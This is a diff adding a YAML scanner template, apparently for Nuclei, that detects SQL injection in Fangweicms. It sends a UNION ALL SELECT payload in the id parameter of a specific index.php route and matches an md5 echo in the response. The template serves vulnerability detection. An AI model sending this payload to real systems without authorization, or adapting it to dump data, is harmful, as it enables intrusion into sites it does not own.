@@ -1,0 +1,20 @@
+id: fangweicms-sqli
+info:
+  name: Fangweicms SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    The template detects an SQL injection vulnerability in Fangweicms by injecting a UNION SELECT payload and verifying the response.
+  tags: sql-injection
+variables:
+  rand: "{{rand_int(10000, 21000)}}"
+http:
+  - method: GET
+    path:
+      - "/index.php?m=Goods&a=showcate&id=103%20UNION%20ALL%20SELECT%20CONCAT(md5({{rand}}))%23"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{md5(rand)}}"
